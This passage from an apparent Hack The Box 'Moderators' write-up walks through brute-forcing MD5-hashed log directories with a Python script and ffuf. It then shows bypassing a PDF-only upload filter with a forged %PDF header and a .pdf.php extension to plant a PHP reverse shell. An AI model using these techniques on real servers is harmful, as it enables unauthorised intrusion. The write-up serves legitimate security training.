+<span id="cb7-20"><a href="#cb7-20" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span> </span>
+<span id="cb7-21"><a href="#cb7-21" aria-hidden="true" tabindex="-1"></a><span class="ex">*</span> Connection <span class="co">#0 to host moderators.htb left intact</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p><strong>4221:</strong></p>
+<div class="sourceCode" id="cb8"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  moderators echo <span class="at">-n</span> <span class="st">"4221"</span> <span class="kw">|</span> <span class="fu">md5sum</span>                                         </span>
+<span id="cb8-2"><a href="#cb8-2" aria-hidden="true" tabindex="-1"></a><span class="ex">74d90aafda34e6060f9e8433962d14fd</span>  <span class="at">-</span></span>
+<span id="cb8-3"><a href="#cb8-3" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  moderators curl <span class="at">-v</span> http://moderators.htb/logs/74d90aafda34e6060f9e8433962d14fd/</span>
+<span id="cb8-4"><a href="#cb8-4" aria-hidden="true" tabindex="-1"></a><span class="ex">*</span>   Trying 10.10.11.173:80...</span>
+<span id="cb8-5"><a href="#cb8-5" aria-hidden="true" tabindex="-1"></a><span class="ex">*</span> Connected to moderators.htb <span class="er">(</span><span class="ex">10.10.11.173</span><span class="kw">)</span> <span class="ex">port</span> 80 <span class="er">(</span><span class="co">#0)</span></span>
+<span id="cb8-6"><a href="#cb8-6" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;</span> GET <span class="ex">/logs/74d90aafda34e6060f9e8433962d14fd/</span> HTTP/1.1</span>
+<span id="cb8-7"><a href="#cb8-7" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;</span> Host: <span class="ex">moderators.htb</span></span>
+<span id="cb8-8"><a href="#cb8-8" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;</span> User-Agent: <span class="ex">curl/7.84.0</span></span>
+<span id="cb8-9"><a href="#cb8-9" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;</span> Accept: <span class="ex">*/*</span></span>
+<span id="cb8-10"><a href="#cb8-10" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;</span> </span>
+<span id="cb8-11"><a href="#cb8-11" aria-hidden="true" tabindex="-1"></a><span class="ex">*</span> Mark bundle as not supporting multiuse</span>
+<span id="cb8-12"><a href="#cb8-12" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span> HTTP/1.1 <span class="ex">200</span> OK</span>
+<span id="cb8-13"><a href="#cb8-13" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span> Date: <span class="ex">Fri,</span> 02 Sep 2022 12:07:45 GMT</span>
+<span id="cb8-14"><a href="#cb8-14" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span> Server: <span class="ex">Apache/2.4.41</span> <span class="er">(</span><span class="ex">Ubuntu</span><span class="kw">)</span></span>
+<span id="cb8-15"><a href="#cb8-15" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span> Last-Modified: <span class="ex">Wed,</span> 24 Nov 2021 09:29:14 GMT</span>
+<span id="cb8-16"><a href="#cb8-16" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span> ETag: <span class="st">"0-5d1857dc7365b"</span></span>
+<span id="cb8-17"><a href="#cb8-17" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span> Accept-Ranges: <span class="ex">bytes</span></span>
+<span id="cb8-18"><a href="#cb8-18" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span> Content-Length: <span class="ex">0</span></span>
+<span id="cb8-19"><a href="#cb8-19" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span> Content-Type: <span class="ex">text/html</span></span>
+<span id="cb8-20"><a href="#cb8-20" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span> </span>
+<span id="cb8-21"><a href="#cb8-21" aria-hidden="true" tabindex="-1"></a><span class="ex">*</span> Connection <span class="co">#0 to host moderators.htb left intact</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p><strong>7612:</strong></p>
+<div class="sourceCode" id="cb9"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  moderators echo <span class="at">-n</span> <span class="st">"7612"</span> <span class="kw">|</span> <span class="fu">md5sum</span>                                         </span>
+<span id="cb9-2"><a href="#cb9-2" aria-hidden="true" tabindex="-1"></a><span class="ex">ce5d75028d92047a9ec617acb9c34ce6</span>  <span class="at">-</span></span>
+<span id="cb9-3"><a href="#cb9-3" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  moderators curl <span class="at">-v</span> http://moderators.htb/logs/ce5d75028d92047a9ec617acb9c34ce6/ </span>
+<span id="cb9-4"><a href="#cb9-4" aria-hidden="true" tabindex="-1"></a><span class="ex">*</span>   Trying 10.10.11.173:80...</span>
+<span id="cb9-5"><a href="#cb9-5" aria-hidden="true" tabindex="-1"></a><span class="ex">*</span> Connected to moderators.htb <span class="er">(</span><span class="ex">10.10.11.173</span><span class="kw">)</span> <span class="ex">port</span> 80 <span class="er">(</span><span class="co">#0)</span></span>
+<span id="cb9-6"><a href="#cb9-6" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;</span> GET <span class="ex">/logs/ce5d75028d92047a9ec617acb9c34ce6/</span> HTTP/1.1</span>
+<span id="cb9-7"><a href="#cb9-7" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;</span> Host: <span class="ex">moderators.htb</span></span>
+<span id="cb9-8"><a href="#cb9-8" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;</span> User-Agent: <span class="ex">curl/7.84.0</span></span>
+<span id="cb9-9"><a href="#cb9-9" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;</span> Accept: <span class="ex">*/*</span></span>
+<span id="cb9-10"><a href="#cb9-10" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;</span> </span>
+<span id="cb9-11"><a href="#cb9-11" aria-hidden="true" tabindex="-1"></a><span class="ex">*</span> Mark bundle as not supporting multiuse</span>
+<span id="cb9-12"><a href="#cb9-12" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span> HTTP/1.1 <span class="ex">200</span> OK</span>
+<span id="cb9-13"><a href="#cb9-13" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span> Date: <span class="ex">Fri,</span> 02 Sep 2022 12:08:50 GMT</span>
+<span id="cb9-14"><a href="#cb9-14" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span> Server: <span class="ex">Apache/2.4.41</span> <span class="er">(</span><span class="ex">Ubuntu</span><span class="kw">)</span></span>
+<span id="cb9-15"><a href="#cb9-15" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span> Last-Modified: <span class="ex">Wed,</span> 24 Nov 2021 09:29:14 GMT</span>
+<span id="cb9-16"><a href="#cb9-16" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span> ETag: <span class="st">"0-5d1857dc949a9"</span></span>
+<span id="cb9-17"><a href="#cb9-17" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span> Accept-Ranges: <span class="ex">bytes</span></span>
+<span id="cb9-18"><a href="#cb9-18" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span> Content-Length: <span class="ex">0</span></span>
+<span id="cb9-19"><a href="#cb9-19" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span> Content-Type: <span class="ex">text/html</span></span>
+<span id="cb9-20"><a href="#cb9-20" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span> </span>
+<span id="cb9-21"><a href="#cb9-21" aria-hidden="true" tabindex="-1"></a><span class="ex">*</span> Connection <span class="co">#0 to host moderators.htb left intact</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p><strong>8121:</strong></p>
+<div class="sourceCode" id="cb10"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  moderators echo <span class="at">-n</span> <span class="st">"8121"</span> <span class="kw">|</span> <span class="fu">md5sum</span>  </span>
+<span id="cb10-2"><a href="#cb10-2" aria-hidden="true" tabindex="-1"></a><span class="ex">afecc60f82be41c1b52f6705ec69e0f1</span>  <span class="at">-</span></span>
+<span id="cb10-3"><a href="#cb10-3" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  moderators curl <span class="at">-v</span> http://moderators.htb/logs/afecc60f82be41c1b52f6705ec69e0f1/</span>
+<span id="cb10-4"><a href="#cb10-4" aria-hidden="true" tabindex="-1"></a><span class="ex">*</span>   Trying 10.10.11.173:80...</span>
+<span id="cb10-5"><a href="#cb10-5" aria-hidden="true" tabindex="-1"></a><span class="ex">*</span> Connected to moderators.htb <span class="er">(</span><span class="ex">10.10.11.173</span><span class="kw">)</span> <span class="ex">port</span> 80 <span class="er">(</span><span class="co">#0)</span></span>
+<span id="cb10-6"><a href="#cb10-6" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;</span> GET <span class="ex">/logs/afecc60f82be41c1b52f6705ec69e0f1/</span> HTTP/1.1</span>
+<span id="cb10-7"><a href="#cb10-7" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;</span> Host: <span class="ex">moderators.htb</span></span>
+<span id="cb10-8"><a href="#cb10-8" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;</span> User-Agent: <span class="ex">curl/7.84.0</span></span>
+<span id="cb10-9"><a href="#cb10-9" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;</span> Accept: <span class="ex">*/*</span></span>
+<span id="cb10-10"><a href="#cb10-10" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;</span> </span>
+<span id="cb10-11"><a href="#cb10-11" aria-hidden="true" tabindex="-1"></a><span class="ex">*</span> Mark bundle as not supporting multiuse</span>
+<span id="cb10-12"><a href="#cb10-12" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span> HTTP/1.1 <span class="ex">200</span> OK</span>
+<span id="cb10-13"><a href="#cb10-13" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span> Date: <span class="ex">Fri,</span> 02 Sep 2022 12:09:44 GMT</span>
+<span id="cb10-14"><a href="#cb10-14" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span> Server: <span class="ex">Apache/2.4.41</span> <span class="er">(</span><span class="ex">Ubuntu</span><span class="kw">)</span></span>
+<span id="cb10-15"><a href="#cb10-15" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span> Last-Modified: <span class="ex">Wed,</span> 24 Nov 2021 09:29:14 GMT</span>
+<span id="cb10-16"><a href="#cb10-16" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span> ETag: <span class="st">"0-5d1857dc7e23f"</span></span>
+<span id="cb10-17"><a href="#cb10-17" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span> Accept-Ranges: <span class="ex">bytes</span></span>
+<span id="cb10-18"><a href="#cb10-18" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span> Content-Length: <span class="ex">0</span></span>
+<span id="cb10-19"><a href="#cb10-19" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span> Content-Type: <span class="ex">text/html</span></span>
+<span id="cb10-20"><a href="#cb10-20" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span> </span>
+<span id="cb10-21"><a href="#cb10-21" aria-hidden="true" tabindex="-1"></a><span class="ex">*</span> Connection <span class="co">#0 to host moderators.htb left intact</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>None of them contain any information..</p>
+</section>
+<section id="step-2" class="level3">
+<h3 class="anchored" data-anchor-id="step-2">Step 2</h3>
+<p>Lets create a simple script to loop through 1 to 10000, create it’s corresponding md5 hash can send a GET request to <code>/logs/</code>. If <code>len(response.text)</code> is not equal to 0, print the result. Note that you can achieve the same thing by using <code>ffuf</code> or similar, but I though it would be fun to build a simple python script.</p>
+<p>Below is the end result and it can be downloaded <a href="../../assets/scripts/moderators_findLogs.py">here</a>.</p>
+<div class="sourceCode" id="cb11"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="co">#!/usr/bin/env python3</span></span>
+<span id="cb11-2"><a href="#cb11-2" aria-hidden="true" tabindex="-1"></a><span class="co"># by 0xPThree - exploit.se</span></span>
+<span id="cb11-3"><a href="#cb11-3" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> colorama <span class="im">import</span> Fore</span>
+<span id="cb11-4"><a href="#cb11-4" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> hashlib</span>
+<span id="cb11-5"><a href="#cb11-5" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> requests</span>
+<span id="cb11-6"><a href="#cb11-6" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> argparse</span>
+<span id="cb11-7"><a href="#cb11-7" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> time</span>
+<span id="cb11-8"><a href="#cb11-8" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb11-9"><a href="#cb11-9" aria-hidden="true" tabindex="-1"></a>r <span class="op">=</span> requests.session()</span>
+<span id="cb11-10"><a href="#cb11-10" aria-hidden="true" tabindex="-1"></a>storage <span class="op">=</span> []</span>
+<span id="cb11-11"><a href="#cb11-11" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb11-12"><a href="#cb11-12" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> getUrl(target, md5sum):</span>
+<span id="cb11-13"><a href="#cb11-13" aria-hidden="true" tabindex="-1"></a>    <span class="co"># Send GET request</span></span>
+<span id="cb11-14"><a href="#cb11-14" aria-hidden="true" tabindex="-1"></a>    url <span class="op">=</span> target <span class="op">+</span> md5sum <span class="op">+</span> <span class="st">"/"</span></span>
+<span id="cb11-15"><a href="#cb11-15" aria-hidden="true" tabindex="-1"></a>    req <span class="op">=</span> r.get(url)</span>
+<span id="cb11-16"><a href="#cb11-16" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> req.status_code <span class="op">==</span> <span class="dv">200</span>: <span class="co">#and len(req.text) != 0:</span></span>
+<span id="cb11-17"><a href="#cb11-17" aria-hidden="true" tabindex="-1"></a>        <span class="bu">print</span>(<span class="st">"Found something on:"</span>, url)</span>
+<span id="cb11-18"><a href="#cb11-18" aria-hidden="true" tabindex="-1"></a>        storage.append(url)</span>
+<span id="cb11-19"><a href="#cb11-19" aria-hidden="true" tabindex="-1"></a>        <span class="cf">return</span></span>
+<span id="cb11-20"><a href="#cb11-20" aria-hidden="true" tabindex="-1"></a>    <span class="cf">else</span>:</span>
+<span id="cb11-21"><a href="#cb11-21" aria-hidden="true" tabindex="-1"></a>        <span class="cf">return</span></span>
+<span id="cb11-22"><a href="#cb11-22" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb11-23"><a href="#cb11-23" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> createMd5(<span class="bu">id</span>):</span>
+<span id="cb11-24"><a href="#cb11-24" aria-hidden="true" tabindex="-1"></a>    md5sum <span class="op">=</span> hashlib.md5(<span class="bu">str</span>(<span class="bu">id</span>).encode()).hexdigest()</span>
+<span id="cb11-25"><a href="#cb11-25" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span>(md5sum)</span>
+<span id="cb11-26"><a href="#cb11-26" aria-hidden="true" tabindex="-1"></a>                                                                         </span>
+<span id="cb11-27"><a href="#cb11-27" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb11-28"><a href="#cb11-28" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> main():</span>
+<span id="cb11-29"><a href="#cb11-29" aria-hidden="true" tabindex="-1"></a>    start <span class="op">=</span> time.time()</span>
+<span id="cb11-30"><a href="#cb11-30" aria-hidden="true" tabindex="-1"></a>    formatter <span class="op">=</span> <span class="kw">lambda</span> prog: argparse.HelpFormatter(prog,max_help_position<span class="op">=</span><span class="dv">70</span>)</span>
+<span id="cb11-31"><a href="#cb11-31" aria-hidden="true" tabindex="-1"></a>    parser <span class="op">=</span> argparse.ArgumentParser(formatter_class<span class="op">=</span>formatter)</span>
+<span id="cb11-32"><a href="#cb11-32" aria-hidden="true" tabindex="-1"></a>    parser.add_argument(<span class="st">'-t'</span>,<span class="st">'--target'</span>, <span class="bu">type</span><span class="op">=</span><span class="bu">str</span>, <span class="bu">help</span><span class="op">=</span><span class="st">'target url'</span>)</span>
+<span id="cb11-33"><a href="#cb11-33" aria-hidden="true" tabindex="-1"></a>    parser.add_argument(<span class="st">'-s'</span>,<span class="st">'--start'</span>, <span class="bu">type</span><span class="op">=</span><span class="bu">int</span>, <span class="bu">help</span><span class="op">=</span><span class="st">'start id'</span>)</span>
+<span id="cb11-34"><a href="#cb11-34" aria-hidden="true" tabindex="-1"></a>    parser.add_argument(<span class="st">'-e'</span>,<span class="st">'--end'</span>, <span class="bu">type</span><span class="op">=</span><span class="bu">int</span>, <span class="bu">help</span><span class="op">=</span><span class="st">'end id'</span>)</span>
+<span id="cb11-35"><a href="#cb11-35" aria-hidden="true" tabindex="-1"></a>    args <span class="op">=</span> parser.parse_args()</span>
+<span id="cb11-36"><a href="#cb11-36" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb11-37"><a href="#cb11-37" aria-hidden="true" tabindex="-1"></a>    <span class="co"># Loop through start to end</span></span>
+<span id="cb11-38"><a href="#cb11-38" aria-hidden="true" tabindex="-1"></a>    <span class="cf">for</span> i <span class="kw">in</span> <span class="bu">range</span>(args.start, args.end):</span>
+<span id="cb11-39"><a href="#cb11-39" aria-hidden="true" tabindex="-1"></a>        <span class="bu">print</span>(<span class="st">"Testing nr."</span>, i)</span>
+<span id="cb11-40"><a href="#cb11-40" aria-hidden="true" tabindex="-1"></a>        md5sum <span class="op">=</span> createMd5(i)</span>
+<span id="cb11-41"><a href="#cb11-41" aria-hidden="true" tabindex="-1"></a>        getUrl(args.target, md5sum)</span>
+<span id="cb11-42"><a href="#cb11-42" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb11-43"><a href="#cb11-43" aria-hidden="true" tabindex="-1"></a>    <span class="co"># Print all results stored in 'storage'</span></span>
+<span id="cb11-44"><a href="#cb11-44" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="kw">not</span> storage:</span>
+<span id="cb11-45"><a href="#cb11-45" aria-hidden="true" tabindex="-1"></a>        <span class="bu">print</span>(<span class="st">"Nothing found.."</span>)</span>
+<span id="cb11-46"><a href="#cb11-46" aria-hidden="true" tabindex="-1"></a>    <span class="cf">else</span>:</span>
+<span id="cb11-47"><a href="#cb11-47" aria-hidden="true" tabindex="-1"></a>        <span class="cf">for</span> i <span class="kw">in</span> <span class="bu">range</span>(<span class="bu">len</span>(storage)):</span>
+<span id="cb11-48"><a href="#cb11-48" aria-hidden="true" tabindex="-1"></a>            <span class="bu">print</span>(<span class="st">"Results"</span>, i, <span class="st">"-"</span>, storage[i])</span>
+<span id="cb11-49"><a href="#cb11-49" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb11-50"><a href="#cb11-50" aria-hidden="true" tabindex="-1"></a>    end <span class="op">=</span> time.time()</span>
+<span id="cb11-51"><a href="#cb11-51" aria-hidden="true" tabindex="-1"></a>    <span class="bu">print</span>(<span class="st">"time elapsed:"</span>, end <span class="op">-</span> start, <span class="st">"seconds"</span>)</span>
+<span id="cb11-52"><a href="#cb11-52" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb11-53"><a href="#cb11-53" aria-hidden="true" tabindex="-1"></a>    </span>
+<span id="cb11-54"><a href="#cb11-54" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> <span class="va">__name__</span> <span class="op">==</span> <span class="st">"__main__"</span>:</span>
+<span id="cb11-55"><a href="#cb11-55" aria-hidden="true" tabindex="-1"></a>    main()</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>Sadly running the script with start 1 and end 10000 doesn’t give us anything that we already knew..</p>
+<div class="sourceCode" id="cb12"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  moderators python3 findLogs.py <span class="at">-t</span> http://moderators.htb/logs/ <span class="at">-s</span> 1 <span class="at">-e</span> 10000</span>
+<span id="cb12-2"><a href="#cb12-2" aria-hidden="true" tabindex="-1"></a><span class="ex">Testing</span> nr. 1</span>
+<span id="cb12-3"><a href="#cb12-3" aria-hidden="true" tabindex="-1"></a><span class="ex">[...</span> snip ...]</span>
+<span id="cb12-4"><a href="#cb12-4" aria-hidden="true" tabindex="-1"></a><span class="ex">Testing</span> nr. 9999</span>
+<span id="cb12-5"><a href="#cb12-5" aria-hidden="true" tabindex="-1"></a><span class="ex">Results</span> 0 <span class="at">-</span> http://moderators.htb/logs/743c41a921516b04afde48bb48e28ce6/</span>
+<span id="cb12-6"><a href="#cb12-6" aria-hidden="true" tabindex="-1"></a><span class="ex">Results</span> 1 <span class="at">-</span> http://moderators.htb/logs/b071cfa81605a94ad80cfa2bbc747448/</span>
+<span id="cb12-7"><a href="#cb12-7" aria-hidden="true" tabindex="-1"></a><span class="ex">Results</span> 2 <span class="at">-</span> http://moderators.htb/logs/74d90aafda34e6060f9e8433962d14fd/</span>
+<span id="cb12-8"><a href="#cb12-8" aria-hidden="true" tabindex="-1"></a><span class="ex">Results</span> 3 <span class="at">-</span> http://moderators.htb/logs/ce5d75028d92047a9ec617acb9c34ce6/</span>
+<span id="cb12-9"><a href="#cb12-9" aria-hidden="true" tabindex="-1"></a><span class="ex">Results</span> 4 <span class="at">-</span> http://moderators.htb/logs/afecc60f82be41c1b52f6705ec69e0f1/</span>
+<span id="cb12-10"><a href="#cb12-10" aria-hidden="true" tabindex="-1"></a><span class="ex">Results</span> 5 <span class="at">-</span> http://moderators.htb/logs/e21cece511f43a5cb18d4932429915ed/</span>
+<span id="cb12-11"><a href="#cb12-11" aria-hidden="true" tabindex="-1"></a><span class="bu">time</span> elapsed: 435.2408220767975 seconds</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>Continue to enumerate the found URLs with <code>ffuf</code>, and we find pdfs!</p>
+<div class="sourceCode" id="cb13"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  moderators ffuf <span class="at">-c</span> <span class="at">-w</span> /usr/share/wordlists/dirb/big.txt <span class="at">-u</span> http://moderators.htb/logs/743c41a921516b04afde48bb48e28ce6/FUZZ.pdf</span>
+<span id="cb13-2"><a href="#cb13-2" aria-hidden="true" tabindex="-1"></a><span class="ex">logs</span>                    [Status: 200, Size: 15187, Words: 776, Lines: 239, Duration: 38ms]</span>
+<span id="cb13-3"><a href="#cb13-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb13-4"><a href="#cb13-4" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  moderators ffuf <span class="at">-c</span> <span class="at">-w</span> /usr/share/wordlists/dirb/big.txt <span class="at">-u</span> http://moderators.htb/logs/b071cfa81605a94ad80cfa2bbc747448/FUZZ.pdf</span>
+<span id="cb13-5"><a href="#cb13-5" aria-hidden="true" tabindex="-1"></a><span class="ex">logs</span>                    [Status: 200, Size: 10059, Words: 754, Lines: 220, Duration: 29ms]</span>
+<span id="cb13-6"><a href="#cb13-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb13-7"><a href="#cb13-7" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  moderators ffuf <span class="at">-c</span> <span class="at">-w</span> /usr/share/wordlists/dirb/big.txt <span class="at">-u</span> http://moderators.htb/logs/74d90aafda34e6060f9e8433962d14fd/FUZZ.pdf</span>
+<span id="cb13-8"><a href="#cb13-8" aria-hidden="true" tabindex="-1"></a><span class="ex">logs</span>                    [Status: 200, Size: 10059, Words: 754, Lines: 220, Duration: 65ms]</span>
+<span id="cb13-9"><a href="#cb13-9" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb13-10"><a href="#cb13-10" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  moderators ffuf <span class="at">-c</span> <span class="at">-w</span> /usr/share/wordlists/dirb/big.txt <span class="at">-u</span> http://moderators.htb/logs/ce5d75028d92047a9ec617acb9c34ce6/FUZZ.pdf</span>
+<span id="cb13-11"><a href="#cb13-11" aria-hidden="true" tabindex="-1"></a><span class="ex">logs</span>                    [Status: 200, Size: 15042, Words: 771, Lines: 239, Duration: 36ms]</span>
+<span id="cb13-12"><a href="#cb13-12" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb13-13"><a href="#cb13-13" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  moderators ffuf <span class="at">-c</span> <span class="at">-w</span> /usr/share/wordlists/dirb/big.txt <span class="at">-u</span> http://moderators.htb/logs/afecc60f82be41c1b52f6705ec69e0f1/FUZZ.pdf</span>
+<span id="cb13-14"><a href="#cb13-14" aria-hidden="true" tabindex="-1"></a><span class="ex">logs</span>                    [Status: 200, Size: 10059, Words: 754, Lines: 220, Duration: 30ms]</span>
+<span id="cb13-15"><a href="#cb13-15" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb13-16"><a href="#cb13-16" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  moderators ffuf <span class="at">-c</span> <span class="at">-w</span> /usr/share/wordlists/dirb/big.txt <span class="at">-u</span> http://moderators.htb/logs/e21cece511f43a5cb18d4932429915ed/FUZZ.pdf</span>
+<span id="cb13-17"><a href="#cb13-17" aria-hidden="true" tabindex="-1"></a><span class="ex">logs</span>                    [Status: 200, Size: 10059, Words: 754, Lines: 220, Duration: 31ms]</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>Download all the <code>log.pfd</code> files:</p>
+<div class="sourceCode" id="cb14"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  moderators curl http://moderators.htb/logs/743c41a921516b04afde48bb48e28ce6/logs.pdf <span class="at">-o</span> 2589-logs.pdf</span>
+<span id="cb14-2"><a href="#cb14-2" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  moderators curl http://moderators.htb/logs/743c41a921516b04afde48bb48e28ce6/logs.pdf <span class="at">-o</span> 3478-logs.pdf</span>
+<span id="cb14-3"><a href="#cb14-3" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  moderators curl http://moderators.htb/logs/74d90aafda34e6060f9e8433962d14fd/logs.pdf <span class="at">-o</span> 4221-logs.pdf</span>
+<span id="cb14-4"><a href="#cb14-4" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  moderators curl http://moderators.htb/logs/ce5d75028d92047a9ec617acb9c34ce6/logs.pdf <span class="at">-o</span> 7612-logs.pdf</span>
+<span id="cb14-5"><a href="#cb14-5" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  moderators curl http://moderators.htb/logs/afecc60f82be41c1b52f6705ec69e0f1/logs.pdf <span class="at">-o</span> 8121-logs.pdf</span>
+<span id="cb14-6"><a href="#cb14-6" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  moderators curl http://moderators.htb/logs/e21cece511f43a5cb18d4932429915ed/logs.pdf <span class="at">-o</span> 9798-logs.pdf</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p><img src="images/moderators02.png" class="img-fluid"></p>
+<p>We find even more new paths, <code>/logs/report_log_upload.php</code>, a file upload!</p>
+<p><img src="images/moderators03.png" class="img-fluid"></p>
+</section>
+<section id="step-3" class="level3">
+<h3 class="anchored" data-anchor-id="step-3">Step 3</h3>
+<p>Trying to upload a php webshell is revoked with the text <em>“Only PDF files are allowed!”</em>, maybe we can bypass this with burp or maybe upload a malicious PDF.</p>
+<p>Playing around with the function we can confirm that we’re able to upload PDF files: <img src="images/moderators04.png" class="img-fluid"></p>
+<p>We are not able to bypass the restriction by changing MIME type and/or file extension: <img src="images/moderators05.png" class="img-fluid"></p>
+<p>However we are able to bypass it by adding <code>%PDF-1.5</code> at the start of our payload, changing extension to <code>.pdf.php</code> and MIME type to <code>application/pdf</code>: <img src="images/moderators06.png" class="img-fluid"></p>
+<p>Browsing to the uploaded file, <code>http://moderators.htb/logs/uploaded/&lt;filename&gt;</code>, we quickly realize that our mini RCE doesn’t work..</p>
+<p><img src="images/moderators07.png" class="img-fluid"></p>
+<p>Instead of going for a webshell, lets go for a php reverse shell right away. The one from <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">Pentestmonkey</a> is usually my go to, and the one used here. <img src="images/moderators08.png" class="img-fluid"></p>
+</section>
+<section id="step-4" class="level3">
+<h3 class="anchored" data-anchor-id="step-4">Step 4</h3>
+<p>Enumerate the box manually as user <code>www-data</code>. - We’re unable to run any commands as sudo - <code>sudo -l</code> - In <code>/home/</code> we find two users - <code>john</code> and <code>lexi</code> - We got read and execute privileges in <code>lexi</code>’s home directory, however we’re unable to read <code>user.txt</code> and/or any file in <code>.ssh</code></p>
